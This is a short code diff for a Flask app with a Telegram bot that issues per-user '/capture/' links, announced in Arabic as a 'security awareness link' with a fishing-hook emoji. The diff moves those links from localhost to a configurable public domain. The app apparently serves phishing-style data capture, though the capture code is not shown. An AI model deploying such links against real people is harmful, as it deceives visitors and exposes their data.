@@ -10,7 +10,7 @@ import threading
 import requests
 from io import BytesIO
 from flask import Flask, render_template, request, jsonify
-from config import TELEGRAM_BOT_TOKEN, ADMIN_CHAT_ID, FLASK_HOST, FLASK_PORT, FLASK_DEBUG
+from config import TELEGRAM_BOT_TOKEN, ADMIN_CHAT_ID, FLASK_HOST, FLASK_PORT, FLASK_DEBUG, WEB_DOMAIN
 
 app = Flask(__name__)
 
@@ -167,8 +167,7 @@ def bot_polling():
                     active_links[link_id] = {"chat_id": chat_id}
 
                     # بناء الرابط
-                    # سيتم استبدال YOUR_DOMAIN لاحقاً عند استلام أول طلب، أو يمكنك استخدام ngrok
-                    capture_url = f"http://localhost:{FLASK_PORT}/capture/{link_id}"
+                    capture_url = f"{WEB_DOMAIN}/capture/{link_id}"
 
                     send_telegram_message(chat_id,
                         f"🎣 <b>رابط الوعي الأمني جاهز!</b>\n\n"
